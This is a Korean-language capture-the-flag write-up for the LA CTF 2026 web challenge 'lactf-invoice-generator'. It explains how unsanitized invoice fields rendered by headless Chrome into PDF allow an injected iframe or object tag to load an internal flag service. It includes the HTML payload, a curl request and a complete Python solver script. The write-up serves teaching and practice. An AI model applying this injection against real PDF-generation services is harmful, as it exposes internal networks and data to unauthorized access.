---
title: "[LA CTF 2026][Web] lactf-invoice-generator"
description: Writing about the "lactf-invoice-generator" of LA CTF 2026.
date: 2026-02-10 01:00:00 +0900
categories: [CTF, LA CTF 2026]
tags: [Web]
toc: true
comments: false
---

## TL;DR
인보이스 생성 기능이 사용자 입력을 sanitize 없이 HTML에 그대로 삽입하고, 
이를 puppeteer로 내부망에서 렌더링한 뒤 PDF로 출력한다.  
`item` 필드에 `<iframe>` 또는 `<object>`를 주입해 내부 컨테이너의 `/flag`를 렌더링시키면, 
PDF에 플래그가 그대로 찍히고 외부에서 추출 가능하다.

## Overview
**lactf-invoice-generator**는 “구매한 물품 목록을 PDF 인보이스로 만들어주는” 웹 서비스다.

- 외부에 노출된 서비스: `invoice-generator`
- 내부망에만 존재하는 서비스: `flag` (외부에서 직접 접근 불가)

핵심은 **인보이스 HTML을 생성할 때 사용자 입력을 그대로 넣고**, 
서버에서 **puppeteer(Headless Chrome)**로 렌더링해 **PDF로 저장**한다는 점이다.

## Solution
### 1) Recon
- 입력값(`name`, `item`, `cost`, `datePurchased`)이 인보이스 HTML에 그대로 삽입된다.
- 서버는 puppeteer로 HTML을 렌더링한 뒤 PDF로 저장한다:
  - `page.setContent()` → `page.pdf()`
- 즉, 입력에 HTML 태그를 넣으면 텍스트가 아니라 브라우저가 HTML로 해석/렌더링한다.

### 2) Root cause
사용자 입력을 HTML에 삽입할 때 escape/sanitize가 없고, 이를 내부망에서 실행되는 headless chrome이 렌더링한다.  
따라서 HTML injection을 통해 브라우저가 내부 서비스(`http://flag:8081/flag`)를 로드하도록 유도할 수 있다.

### 3) Exploit
`item` 필드에 내부 서비스로 향하는 `<iframe>`(또는 `<object>`)를 주입한다.  
렌더링 결과가 PDF로 굽혀지므로, PDF 안에 내부 페이지 내용(= flag)이 포함된다.

### 4) Flag
생성된 `invoice.pdf`에서 텍스트를 추출하면 플래그 문자열이 나온다.

## Solver
### 1) Exploit Payload
`item` 필드에 아래를 주입:

```html
<iframe src="http://flag:8081/flag" style="width:900px;height:300px;border:3px solid black"></iframe>
```

### 2) Request
```bash
curl -s -X POST "https://<INSTANCE>/generate-invoice" \
  -H "Content-Type: application/json" \
  -d '{
    "name":"test",
    "item":"<iframe src=\"http://flag:8081/flag\" style=\"width:900px;height:300px;border:3px solid black\"></iframe>",
    "cost":"1",
    "datePurchased":"2026-01-01"
  }' --output invoice.pdf
```

### 3) Extraction from PDF
```bash
sudo apt-get install -y poppler-utils
pdftotext invoice.pdf - | grep -o 'lactf{[^}]*}'
```

### 4) Result
puppeteer가 내부망에서만 접근 가능한 `flag` 서버 페이지를 로드하고, 그 렌더링 결과가 PDF로 저장된다.  
따라서 PDF에서 플래그 문자열을 추출할 수 있다.

```text
$ pdftotext invoice.pdf - | grep -o 'lactf{[^}]*}'
lactf{...}
```

**Flag:** `lactf{plz_s4n1t1z3_y0ur_purch4s3_l1st}`

---

## solve.py
```bash
```python
#!/usr/bin/env python3
import argparse
import re
import subprocess
import sys
from urllib.parse import urljoin

import requests

IFRAME = '<iframe src="http://flag:8081/flag" style="width:900px;height:300px;border:3px solid black"></iframe>'
OBJECT = '<object data="http://flag:8081/flag" type="text/html" style="width:900px;height:400px;border:3px solid black"></object>'

FLAG_RE = re.compile(r"lactf\{[^}]+\}")

def generate_pdf(base: str, payload: str, out_path: str) -> None:
    """
    POST /generate-invoice with injected HTML, save response as PDF.
    Assumes server returns PDF content directly.
    """
    base = base.rstrip("/") + "/"
    url = urljoin(base, "generate-invoice")

    data = {
        "name": "test",
        "item": payload,
        "cost": "1",
        "datePurchased": "2026-01-01",
    }

    r = requests.post(url, json=data, timeout=30)
    r.raise_for_status()

    # best-effort: verify content-type contains pdf
    ctype = r.headers.get("Content-Type", "")
    if "pdf" not in ctype.lower():
        # still write output, but warn
        print(f"[!] Warning: Content-Type looks non-PDF: {ctype}", file=sys.stderr)

    with open(out_path, "wb") as f:
        f.write(r.content)

    print(f"[+] Saved: {out_path} ({len(r.content)} bytes)")

def extract_flag_from_pdf(pdf_path: str) -> str | None:
    """
    Extract text via pdftotext and grep flag pattern.
    Requires poppler-utils installed.
    """
    try:
        out = subprocess.check_output(["pdftotext", pdf_path, "-"], stderr=subprocess.STDOUT)
    except FileNotFoundError:
        print("[!] pdftotext not found. Install: sudo apt-get install -y poppler-utils", file=sys.stderr)
        return None
    except subprocess.CalledProcessError as e:
        print("[!] pdftotext failed:", e.output.decode(errors="ignore"), file=sys.stderr)
        return None

    text = out.decode(errors="ignore")
    m = FLAG_RE.search(text)
    return m.group(0) if m else None

def main():
    ap = argparse.ArgumentParser(description="LACTF invoice-generator solver")
    ap.add_argument("--base", required=True, help="Base URL, e.g. https://<INSTANCE>")
    ap.add_argument("--out", default="invoice.pdf", help="Output PDF path")
    ap.add_argument("--payload", choices=["iframe", "object"], default="iframe", help="HTML embedding method")
    ap.add_argument("--extract", action="store_true", help="Extract flag from PDF after download")
    args = ap.parse_args()

    payload = IFRAME if args.payload == "iframe" else OBJECT

    generate_pdf(args.base, payload, args.out)

    if args.extract:
        flag = extract_flag_from_pdf(args.out)
        if flag:
            print(f"[+] Flag: {flag}")
        else:
            print("[!] Flag not found in extracted text.", file=sys.stderr)
            sys.exit(2)

if __name__ == "__main__":
    main()
```
